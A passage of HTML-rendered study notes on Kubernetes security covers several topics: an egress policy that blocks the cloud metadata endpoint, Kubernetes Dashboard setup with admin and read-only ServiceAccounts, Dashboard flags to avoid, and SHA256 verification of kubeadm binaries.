&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;default-deny-egress-metadata-server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;a12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;podSelector&lt;/span&gt;: {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;policyTypes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;Egress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;egress&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;to&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#f92672&#34;&gt;ipBlock&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;cidr&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0.0.0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;/0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;except&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#ae81ff&#34;&gt;169.254.169.254&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;/32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once the network policy has been created, Pods in the namespace a12 should not be able to reach the metadata endpoints anymore.&lt;/p&gt;
&lt;h2 id=&#34;protecting-gui-elements&#34;&gt;Protecting GUI Elements&lt;/h2&gt;
&lt;p&gt;The kubectl tool isn’t the only user interface (UI) for managing a cluster. While kubectl allows for fine-grained operations, most organizations prefer a more convenient graphical user interface (GUI) for managing the objects of a cluster. You can choose from a variety of options. The Kubernetes &lt;em&gt;Dashboard&lt;/em&gt; is a free, web-based application.&lt;/p&gt;
&lt;p&gt;Other GUI dashboards for Kubernetes like &lt;em&gt;Portainer&lt;/em&gt; go beyond the basic functionality by adding tracing of events or visualizations of hardware resource consumption. In this section, we’ll focus on the Kubernetes Dashboard as it is easy to install and configure.&lt;/p&gt;
&lt;p&gt;The Kubernetes Dashboard runs as a Pod inside of the cluster.&lt;/p&gt;
&lt;p&gt;In order to install Kubernetes Dashboard simply run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Add kubernetes-dashboard repository&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Deploy a Helm Release named &amp;#34;kubernetes-dashboard&amp;#34; using the kubernetes-dashboard chart&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get deployments,pods,services -n kubernetes-dashboard
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 140834.png]]&lt;/p&gt;
&lt;p&gt;As we can see, kong-proxy type in &lt;em&gt;ClusterIP&lt;/em&gt;, which means we can&amp;rsquo;t access it outside the cluster, it needs to be type of &lt;em&gt;NodePort&lt;/em&gt; and we need to enable http communication so that we can access it via the browser.&lt;/p&gt;
&lt;p&gt;Create values.yaml:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kong&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  proxy&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;    type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NodePort&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  http&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;    enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm upgrade kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard -f values.yaml --namespace kubernetes-dashboard  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 152814.png]]&lt;/p&gt;
&lt;p&gt;To access Dashboard run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard-kong-proxy 8443:443
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Forwarding from 127.0.0.1:8443 -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8443&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Forwarding from &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;::1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:8443 -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8443&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now go to &lt;code&gt;https://localhost:8443&lt;/code&gt; and it will ask you to prompt the bearer token.&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 153040.png]]&lt;/p&gt;
&lt;h3 id=&#34;creating-a-user-with-administration-privileges&#34;&gt;Creating a User with Administration Privileges&lt;/h3&gt;
&lt;p&gt;Before you can authenticate in the login screen, you need to create a ServiceAccount and ClusterRoleBinding object that grant admin permissions. Start by creating the file admin-user-serviceaccount.yaml .&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 144426.png]]&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create -f admin-user-serviceaccount.yaml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create -f admin-user-clusterrole&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;binding.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can now create the bearer token of the admin user with the following command. The command will generate a token for the provided ServiceAccount object and render it on the console.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create token admin-user -n kubernetes-dashboard
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 223627.png]]&lt;/p&gt;
&lt;p&gt;Go to the Dashboard and feed it the token to access.&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 153249.png]]&lt;/p&gt;
&lt;h3 id=&#34;creating-a-user-with-restricted-privileges&#34;&gt;Creating a User with Restricted Privileges&lt;/h3&gt;
&lt;p&gt;In the previous section, you learned how to create a user with cluster-wide admin‐ istrative permissions. Most users of the Dashboard only need a restricted set of per‐ missions, though. For example, developers implementing and operating cloud-native applications will likely only need a subset of administrative permissions to perform their tasks on a Kubernetes cluster.&lt;/p&gt;
&lt;p&gt;Creating a user for the Dashboard with restricted privileges consists of a three-step approach:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create a ServiceAccount object.&lt;/li&gt;
&lt;li&gt;Create a ClusterRole object that defines the permissions.&lt;/li&gt;
&lt;li&gt;Create a ClusterRoleBinding that maps the ClusterRole to the ServiceAccount.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ServiceAccount&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;developer-user&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kubernetes-dashboard&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ClusterRole&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;annotations&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;rbac.authorization.kubernetes.io/autoupdate&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;cluster-developer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;rules&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;apiGroups&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;resources&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;verbs&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;get&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;list&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;watch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;nonResourceURLs&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;verbs&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;get&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;list&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;watch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ClusterRoleBinding&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;developer-user&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;roleRef&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;apiGroup&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;rbac.authorization.k8s.io&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ClusterRole&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;cluster-developer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;subjects&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ServiceAccount&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;developer-user&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kubernetes-dashboard&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create token developer-user -n kubernetes-dashboard
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 223352.png]]&lt;/p&gt;
&lt;p&gt;Developer user cannot delete a pod, let&amp;rsquo;s try;&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 155914.png]]&lt;/p&gt;
&lt;p&gt;An error message rendered when trying to invoke a permitted operation.&lt;/p&gt;
&lt;h3 id=&#34;avoiding-insecure-configuration-arguments&#34;&gt;Avoiding Insecure Configuration Arguments&lt;/h3&gt;
&lt;p&gt;Securing the Dashboard in production environments involves the usage of execution arguments necessary for properly configuring authentication and authorization. By default, login functionality is enabled and the HTTPS endpoint will be exposed on port 8443. You can provide TLS certificates with the &amp;ndash;tls-cert-file and &amp;ndash;tlscert-key command line options if you don’t want them to be auto-generated.&lt;/p&gt;
&lt;p&gt;Avoid setting the command line arguments &amp;ndash;insecure-port to expose an HTTP endpoint and &amp;ndash;enable-insecure-login to enable serving the login page over HTTP instead of HTTPS. Furthermore, make sure you don’t use the option &amp;ndash;enable-skip-login as it would allow circumventing an authentication method by simply clicking a Skip button in the login screen.&lt;/p&gt;
&lt;h2 id=&#34;verifying-kubernetes-platform-binaries&#34;&gt;Verifying Kubernetes Platform Binaries&lt;/h2&gt;
&lt;p&gt;The Kubernetes project publishes client and server binaries with every release&lt;/p&gt;
&lt;p&gt;The executables kubectl and kubeadm are essential for interacting with Kubernetes. kubectl lets you run commands against the API server.&lt;/p&gt;
&lt;p&gt;Know how to detect modified platform binaries&lt;/p&gt;
&lt;p&gt;Platform binaries like kubectl and kubeadm can be verified against their corresponding hash code. Know where to find the hash file and how to use a validation tool to identify if the binary has been tempered with.&lt;/p&gt;
&lt;p&gt;You can download the corresponding hash code for a binary from &lt;a href=&#34;https://dl.k8s.io&#34;&gt;https://dl.k8s.io&lt;/a&gt;. The full URL for a hash code reflects the version, operating system, and architecture of the binary. The following list shows example URLs for platform binaries compati‐ ble with Linux AMD64:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;kubectl: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubectl.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubectl.sha256&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;kubeadm: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm.sha256&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;kubelet: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubelet.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubelet.sha256&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;kube-apiserver: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kube-apiserver.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kube-apiserver.sha256&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The following commands demonstrate downloading the kubeadm binary for version 1.26.1 and its corresponding SHA256 hash file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -LO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -LO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm.sha256&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The validation tool shasum can verify if the checksum matches:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat kubeadm.sha256&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; kubeadm&amp;#34;&lt;/span&gt; | shasum -a &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; --check 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubeadm: OK 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The previous command returned with an “OK” message. The binary file wasn’t tampered with. Any other message indicates a potential security risk when executing the binary&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 130827.png]]&lt;/p&gt;
&lt;h4 id=&#34;understand-the-purpose-and-effects-of-network-policies&#34;&gt;Understand the Purpose and Effects of Network Policies&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Default Behavior&lt;/strong&gt;: By default, Pod-to-Pod communication is unrestricted.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Default Deny Rule&lt;/strong&gt;: Instantiate a default deny rule to restrict Pod-to-Pod network traffic, applying the principle of least privilege.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Network Policy Attributes&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;spec.podSelector&lt;/code&gt;&lt;/strong&gt;: Selects the target Pod for the rules based on label selection.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ingress and Egress Rules&lt;/strong&gt;: Define Pods, namespaces, IP addresses, and ports for allowing incoming and outgoing traffic.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Aggregation of Policies&lt;/strong&gt;: Network policies can be aggregated. A default deny rule may disallow ingress and/or egress traffic. Additional policies can open up those rules with more fine-grained definitions.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;practice-the-use-of-kube-bench-to-detect-cluster-component-vulnerabilities&#34;&gt;Practice the Use of &lt;code&gt;kube-bench&lt;/code&gt; to Detect Cluster Component Vulnerabilities&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Kubernetes CIS Benchmark&lt;/strong&gt;: A set of best practices for recommended security settings in a production Kubernetes environment.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Automation with &lt;code&gt;kube-bench&lt;/code&gt;&lt;/strong&gt;: Automate the detection of security risks using &lt;code&gt;kube-bench&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Report Interpretation&lt;/strong&gt;: The generated report describes detailed remediation actions to fix detected issues. Learn to interpret the results and mitigate issues.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;know-how-to-configure-ingress-with-tls-termination&#34;&gt;Know How to Configure Ingress with TLS Termination**&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ingress Configuration&lt;/strong&gt;: An Ingress can be configured to expose an HTTPS endpoint to send and receive encrypted data.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TLS Secret&lt;/strong&gt;: Create a TLS Secret object and assign it a TLS certificate and key. The Secret can be consumed by the Ingress using the &lt;code&gt;spec.tls[]&lt;/code&gt; attribute.&lt;/li&gt;
&lt;/ul&gt;
